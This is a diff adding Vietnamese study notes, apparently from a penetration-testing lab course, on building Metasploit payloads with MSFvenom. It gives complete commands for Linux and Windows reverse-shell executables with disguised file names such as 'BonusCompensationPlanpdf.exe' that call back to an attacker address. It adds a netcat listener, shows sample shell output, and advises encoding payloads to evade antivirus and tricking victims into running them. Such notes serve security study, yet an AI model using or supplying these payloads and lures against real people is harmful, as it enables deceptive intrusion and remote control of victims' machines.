@@ -1,0 +1,105 @@
+1. Giới thiệu về MSFvenom
+  MSFvenom là công cụ trong Metasploit dùng để:
+    Tạo payload thủ công (thay vì phụ thuộc exploit module tự động).
+    Mã hoá / encode payload để bypass AV/EDR.
+    Chọn định dạng output (exe, elf, asp, php, raw…).
+  Thường dùng trong tình huống:
+    Không thể trực tiếp khai thác qua mạng.
+    Muốn tự tạo file độc hại gửi qua email, USB, hoặc social engineering.
+
+2. Liệt kê Payloads
+    msfvenom -l payloads
+  Hiển thị danh sách payload sẵn có (hơn 500).
+  Quy tắc đặt tên payload:
+    Bắt đầu bằng hệ điều hành (windows/, linux/, osx/, multi/...).
+    Tiếp theo là kiểu shell/payload (meterpreter, shell).
+    Kết thúc bằng phương thức kết nối (reverse_tcp, bind_tcp, reverse_http...).
+
+3. Phân biệt Staged vs. Stageless Payloads
+Có 2 loại payload 
+| Loại                                              | Đặc điểm                                                      | Ưu điểm                                 | Nhược điểm                                |
+| ------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------- | ----------------------------------------- |
+| **Staged** (`windows/meterpreter/reverse_tcp`)    | Payload gửi từng phần (stage loader trước, rồi tải shellcode) | Nhẹ, ít bị chặn ban đầu                 | Dễ gây session không ổn định nếu mạng kém |
+| **Stageless** (`windows/meterpreter_reverse_tcp`) | Payload gửi toàn bộ một lần                                   | Ổn định, ít traffic mạng, dễ bypass IDS | Kích thước lớn hơn                        |
+
+4. Ví dụ tạo payload với MSFvenom
+  Linux reverse shell (.elf)
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+      -p → chọn payload.
+      LHOST/LPORT → địa chỉ & port nhận kết nối.
+      -f elf → định dạng ELF cho Linux.
+      Output là file createbackup.elf.
+  Windows reverse shell (.exe)
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+      Sinh file .exe, khi chạy sẽ kết nối ngược về máy tấn công.
+
+5. Triển khai & Kết nối
+  Dùng netcat hoặc multi/handler của Metasploit để lắng nghe:
+    sudo nc -lvnp 443
+  Khi nạn nhân chạy file → bạn nhận được shell:
+    Connection received on 10.129.x.x 49679
+    Microsoft Windows [Version ...]
+    C:\Users\htb-student\Downloads>
+
+6. Ý nghĩa thực tiễn
+  Tự do lựa chọn cách phát tán payload (email, USB, download link).
+  Hữu ích khi pentest onsite hoặc khi không có exploit module phù hợp.
+  Có thể encode payload để giảm khả năng bị antivirus chặn.
+
+* Điểm nhớ quan trọng
+    Staged = nhỏ gọn nhưng cần nhiều bước giao tiếp mạng.
+    Stageless = nguyên khối, ổn định, phù hợp môi trường có độ trễ cao.
+    msfvenom có thể xuất payload ra nhiều định dạng file, tuỳ hệ điều hành mục tiêu.
+    Cần listener (nc hoặc Metasploit handler) trước khi nạn nhân chạy file để bắt shell thành công.
+
+
+
+
+
+
+Mindmap: Crafting Payloads with MSFvenom
+
+MSFvenom Payload Workflow
+│
+├── 1. Chuẩn bị
+│   ├─ Xác định hệ điều hành mục tiêu (Windows, Linux, macOS, multi)
+│   ├─ Chọn kiểu shell
+│   │   ├─ Meterpreter (nhiều chức năng)
+│   │   └─ Shell thường (nhẹ, đơn giản)
+│   └─ Chọn phương thức kết nối
+│       ├─ reverse_tcp (thường dùng nhất)
+│       ├─ bind_tcp (ít dùng, yêu cầu mở port target)
+│       └─ reverse_http/https (ẩn lưu lượng)
+│
+├── 2. Chọn loại payload
+│   ├─ Staged
+│   │   ├─ Gửi loader trước, tải payload sau
+│   │   └─ Ví dụ: windows/meterpreter/reverse_tcp
+│   └─ Stageless
+│       ├─ Toàn bộ payload trong 1 lần gửi
+│       └─ Ví dụ: windows/meterpreter_reverse_tcp
+│
+├── 3. Tạo payload
+│   ├─ Lệnh: msfvenom
+│   │   ├─ -p <payload>        # Chọn payload
+│   │   ├─ LHOST=<IP attacker> # Địa chỉ kết nối về
+│   │   ├─ LPORT=<port>        # Cổng lắng nghe
+│   │   ├─ -f <format>         # Định dạng (exe, elf, asp, raw)
+│   │   └─ > output_file       # Tên file xuất
+│   └─ Ví dụ:
+│       └─ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > payload.exe
+│
+├── 4. Thiết lập listener
+│   ├─ Dùng netcat
+│   │   └─ sudo nc -lvnp 443
+│   └─ Hoặc dùng Metasploit multi/handler
+│
+├── 5. Triển khai payload
+│   ├─ Gửi file qua email, USB, link tải, SMB share...
+│   └─ Thuyết phục nạn nhân chạy file (social engineering)
+│
+└── 6. Bắt shell & tương tác
+    ├─ Khi file được chạy → nhận kết nối về listener
+    ├─ Duyệt thư mục, upload/download file
+    └─ Nếu là Meterpreter → có thêm tính năng keylogging, process management
+
